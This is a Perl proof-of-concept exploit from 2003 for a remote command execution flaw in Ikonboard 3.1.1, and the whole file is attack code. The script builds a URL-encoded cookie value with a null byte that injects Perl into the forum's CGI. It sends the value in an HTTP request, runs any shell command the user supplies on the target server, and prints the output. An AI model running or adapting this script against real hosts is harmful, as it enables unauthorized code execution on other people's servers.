#!/usr/bin/perl
#
#  Date: 5 May 2003
#  Author: snooq [http://www.angelfire.com/linux/snooq/]
#
#  Ikonboard 3.1.1 Remote Command Execution PoC
#  ============================================
#  This bug was found by Nick Cleaton.
#
#  For more info and patch, go to:
#  http://archives.neohapsis.com/archives/bugtraq/2003-04/0027.html
#
#  Use at your very own risk.
#
#  Greetz.. my team mates: JF, Nam, ET..
#  And some new frens: Kader, Bufferoulis, Neil... ;)
#
use Socket;
use FileHandle;

if ($ARGV[0] eq '') {
	print "Usage: $0 <host> [cmd] [path]\n";
	exit;
}

my $port=80;
my $host=$ARGV[0];
my $addr=getaddr($ARGV[0]);
my $cmd=$ARGV[1]?($ARGV[1]):"/bin/uname -a";
my $path=$ARGV[2]?($ARGV[2]):"/cgi-bin/ikonboard.cgi";
my $buff=URLEncode(".\0\" unless(1);"
		   ."print \"Content-type: text/plain\\r\\n\\r\\n\";"
		   ."print \"---BEGIN---\\n\".`$cmd`.\"\\n---END---\";exit;#");

socket(SOCKET,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2]);
connect(SOCKET,pack('Sna4x8',AF_INET,$port,$addr,2)) || die "Can't connect: $!\n";

SOCKET->autoflush();

print SOCKET "GET $path HTTP/1.1\r\n";
print SOCKET "Host: $host\r\n";
print SOCKET "Cookie: lang=$buff\r\n";
print SOCKET "Connection: close\r\n\r\n";
print "Ikonboard Exploit, by snooq [ jinyean\@hotmail.com ]\n\n";

while (<SOCKET>) {
	if (/^---BEGIN---/) {
		print "> $cmd\n";
		while (<SOCKET>){
			if (/^---END---/) { exit; }
			print; 
		} 
	}
}

print "$host seems not vulnerable.\n";

exit;

sub getaddr {
	my $host=($_[0]);
	my $n=$host;
	$n=~tr/\.//d;

	if ($n=~m/\d+/) {
		return pack('C4',split('\.',$host));
	}
	else {
		return (gethostbyname($host))[4];
	}
}

# URLEncode routine, courtesy of Glenn Fleishman 

sub URLEncode {
	my $theURL=$_[0];
	$theURL=~ s/([\W])/"%".uc(sprintf("%2.2x",ord($1)))/eg;
	return $theURL;
}



